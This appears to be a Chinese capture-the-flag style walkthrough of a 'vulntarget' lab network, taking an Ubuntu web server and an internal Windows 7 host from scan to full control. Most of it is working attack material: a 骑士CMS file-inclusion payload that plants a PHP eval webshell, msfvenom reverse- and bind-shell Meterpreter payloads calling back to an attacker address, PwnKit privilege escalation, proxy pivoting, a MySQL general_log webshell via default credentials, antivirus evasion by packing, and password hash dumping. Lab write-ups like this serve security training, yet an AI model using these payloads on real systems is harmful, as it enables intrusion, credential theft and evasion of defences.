#Web Server
OS:Ubuntu

NIC1：192.168.12.173
NCI2：10.0.20.131/24
userpass:eval/vulntarget

#内网机器
OS：Windows 7
Server:PhPStudy
NIC:10.0.20.136/24
userpass:crow/admin

一、边界主机

（一）获取shell

1 对目标主机进行全面的扫描，发现主机开放80、81、888、3306、8888端口

nmap 192.168.12.173 -A -sT -v -Pn

2 经过探测发现81端口对应的站点为骑士CMS，在页面的底部发现为骑士CMS v6.0.20可寻找相关的版本漏洞

http://192.168.12.173:81/

3 利用文件包含getshell，通过插件写入shell。同时可以去靶机上去查看验证。

http://192.168.12.173:81/index.php?m=home&a=assign_resume_tpl

#post:
variable=1&tpl=<?php fputs(fopen("du.php","w"),"<?php eval(\\$_POST[du]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>

#日志文件的位置
/www/wwwroot/upload/data/Runtime/Logs/Home/年份_月份_日期.log

4 成功写入日志，开始进行文件包含，文件包含日志成功后会在upload目录下生成du.php

#poc
URL：http://192.168.12.173:81/index.php?m=home&a=assign_resume_tpl
POST：variable=1&tpl=data/Runtime/Logs/Home/23_08_11.log

#木马验证
http://192.168.12.173:81/du.php

5 使用蚁剑连接，成功获取低权限的用户的www

（二）提权

1 上线MSF，利用蚁剑上传后门木马并且尝试进行提权

#生成木马
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.12.172 lport=8003 -f elf -o 11.elf

#最高权限
chmod 777 11.elf

#MSF开启监听
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.12.172
set lport 8003
run

2 进入到/home/eval/Desktop目录下发现Flag信息

cd /home/eval/Desktop

3 对linux主机进行简单信息收集，尝试进行提权

方法一：直接使用MSF里面的模块进行提权

#使用MSF中的提权模块--时间有点久
post/multi/recon/local_exploit_suggester

exploit/linux/local/cve_2021_3493_overlayfs---》失败
exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec--》成功

方法二：使用命令收集的linux版本信息，尝试使用CVE-2021-4034进行提权…下载以下项目并执行即可提权成功

#查看版本信息
uname -a

#项目地址
https://github.com/arthepsy/CVE-2021-4034

#执行命令
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
./cve-2021-4034-poc

二、内网主机

（一）获取shell

1 对内网信息进行收集，发现另外一个网卡，MSF设置路由并设置代理

#信息收集
ifconfig

#网卡
192.168.12.173
10.0.20.131

#添加路由
run post/multi/manage/autoroute

#开启代理
use auxiliary/server/socks_proxy

2 使用MSF中的auxiliary/scanner/portscan/tcp模块进行主机存活扫描..

#扫描模块
use auxiliary/scanner/portscan/tcp
set rhosts 10.0.20.0/24
set ports 21,22,23,80,443,8080,3389,445
set threads 50
run

3 配置proxychains的代理且使用Nmap对目标进行端口开放扫描…发现还开发3306端口.

proxychains nmap -sT -Pn 10.0.20.136 -p22,23,80,139,445,1433,3306,3389,6379,8080

4 使用目录扫描工具对网站进行扫描，发现存在PHPMyadmin目录访问且尝试登录

http://10.0.20.136/phpmyadmin/
http://10.0.20.136/phpinfo.php
http://10.0.20.136/l.php

5 使用root:root默认密码成功登陆且在phpinfo.php页面发现存在站点绝对路径，通过写日志来GetShell.

#网站路径
C:\phpstudy\PHPTutorial\WWW\phpinfo.php

#Getshell
show global variables like "%genera%";          //查询general_log配置
set global general_log='on';              //开启general log模式
SET global general_log_file='C:/phpstudy/PHPTutorial/WWW/sdu.php';    //设置日志文件保存路径
SELECT '<?php @eval($_POST["vuln"]); ?>';     //phpinfo()写入日志文件
set global general_log='off';              //关闭general_log模式

（二）上线MSF

1 进行信息收集

whoami		#win-d4s86jo2r26\crow
ipconfig /all       --》工作组：10.0.20.136
ping www.baidu.com  --》不出网络环境
net user crow   --》 管理员组
tasklist /svc   --》 存在火绒

2 内网主机是不出网而且存在火绒所以生成一个正向免杀马进行连接…连接成功！

#生成木马，免杀使用加壳免杀
msfvenom -p windows/x64/meterpreter/bind_tcp lport=9001 -f exe -o sysd.exe

#开启监听
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 9001
set rhost 10.0.20.136
run

3 提升权限抓取明文密码进行破解..开启远程桌面连接登陆

#执行命令  
getsystem     //ok
hashdump      //admin密码为空;crow密码为admin;
run post/windows/manage/enable_rdp    //ok
